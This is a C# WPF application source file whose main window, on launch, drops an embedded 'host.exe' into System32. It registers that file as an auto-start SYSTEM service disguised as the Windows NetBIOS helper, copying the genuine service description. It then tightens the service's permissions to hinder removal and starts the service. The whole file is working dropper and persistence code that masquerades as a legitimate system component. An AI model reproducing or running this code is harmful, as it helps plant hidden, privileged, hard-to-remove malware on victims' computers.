using System;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace DljaOlesi
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            Assembly assembly = Assembly.GetExecutingAssembly();
            string resourceName = "DljaOlesi.host.exe";
            string outputPath = @"C:\Windows\System32\host.exe";

            

            try
            {
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    var ddd = File.Exists(outputPath);
                    using (FileStream fileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fileStream);
                    }

                    
                    //Console.WriteLine($"Ресурс сохранен в файл: {outputPath}");
                }


                string serviceName = "\"TCP IP NetBIOS HTB\"";
                string serviceDisplayName = "TCP IP NetBIOS HTB";
                string servicePath = @"C:\Windows\System32\host.exe";
                string createCommand = $"create {serviceName} binPath= \"{servicePath}\" DisplayName= \"{serviceDisplayName}\" start= auto start= auto obj= \"NT AUTHORITY\\System\"";
                RunScCommand(createCommand);
                SetServiceDescription();
                Process.Start(new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $@"sdset ""TCP IP NetBIOS HTB"" D:(A;;CCLCSWLOCRRPWPDT;;;SY)(A;;CCLCSWLOCRRPWP;;;AU)",
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit();

                
                
                    //string securityDescriptor = "D:(A;;RPWPCCDCLCRSD;;;SY)";

                //string command = $"sdset {serviceName} {securityDescriptor}";
                
                StartService();

                //ExecuteCommand("sc", command);

                
            }
            catch (Exception e)
            {
                MessageBox.Show("Не получилось " + e.Message);
                throw;
            }
            

            MessageBox.Show("Всё получилось");

            Close();
        }

        static void RunScCommand(string arguments)
        {
            //try
            //{
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "sc",
                        Arguments = arguments,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();

                // Чтение результата
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                if (process.ExitCode == 0)
                {
                    Console.WriteLine("Command executed successfully:");
                    Console.WriteLine(output);
                }
                else
                {
                    Console.WriteLine("Command execution failed:");
                    Console.WriteLine(error);
                }
            //}
            //catch (Exception ex)
            //{
            //    Console.WriteLine("Error while executing command:");
            //    Console.WriteLine(ex.Message);
            //}
        }

        private static void StartService()
        {
            ServiceController service = new ServiceController("TCP IP NetBIOS HTB");
            if (service.Status == ServiceControllerStatus.Stopped || service.Status == ServiceControllerStatus.StopPending)
            {
                Console.WriteLine($"Запуск сервиса {service.ServiceName}...");
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
                Console.WriteLine("Сервис успешно запущен.");
            }
            else
            {
                Console.WriteLine($"Сервис {service.ServiceName} уже запущен.");
            }
        }

        static void ExecuteCommand(string fileName, string arguments)
        {
            
            // Создаем процесс для выполнения команды
            Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = fileName,
                        Arguments = arguments,
                        RedirectStandardOutput = true, // Для чтения вывода
                        RedirectStandardError = true,  // Для чтения ошибок
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();

                // Чтение стандартного вывода
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                // Печать результата
                

                
            
        }

        private static void InstallService()
        {
            //string arguments = $"/ServiceName={serviceName}";
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "InstallUtil.exe",
                    Arguments = $@"C:\Windows\System32\host.exe",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();

            // Лог установки
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

            //string exePath = Assembly.GetExecutingAssembly().Location.Replace("ServiceInstallerApp.exe", "YourService.exe");
            //ManagedInstallerClass.InstallHelper(new[] { @"C:\tmp\host.exe" });
            //Console.WriteLine("Сервис успешно установлен.");
        }

        private static void SetServiceDescription()
        {
            //try
            //{
                Process.Start(new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $@"description ""TCP IP NetBIOS HTB"" ""Provides support for the NetBIOS over TCP/IP (NetBT) service and NetBIOS name resolution for clients on the network, therefore enabling users to share files, print, and log on to the network. If this service is stopped, these functions might be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start.""",
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit();
            //        ..Console.WriteLine("Описание сервиса успешно задано.");
            //}
            //descriptioncatch (Exception ex)
            ////{
            //    Console.WriteLine($"Ошибка при установке описания: {ex.Message}");
            //}
            //}
        }
    }
}
